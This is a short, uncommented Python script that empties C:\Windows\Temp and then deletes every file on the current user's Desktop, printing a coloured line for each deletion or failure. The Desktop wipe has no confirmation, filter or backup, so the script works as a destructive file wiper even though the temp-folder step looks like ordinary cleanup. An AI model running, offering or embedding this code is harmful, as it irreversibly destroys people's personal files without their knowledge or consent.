import os
import sys
from colorama import init, Fore as cc
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET
try:
    username = os.environ.get("USERNAME")
except:
    username = os.environ.get("USER")
temp = f"C:\\Windows\\Temp"
desk = f"C:\\Users\\{username}\\Desktop"
for f in os.listdir(temp):
    try:
        os.remove(os.path.join(temp, f))
        print(f"{g}[+] Deleted {f}")
    except:
        print(f"{r}[+] Failed to delete {f}")
for f in os.listdir(desk):
    try:
        os.remove(os.path.join(desk, f))
        print(f"{g}[+] Deleted {f}")
    except:
        print(f"{r}[+] Failed to delete {f}")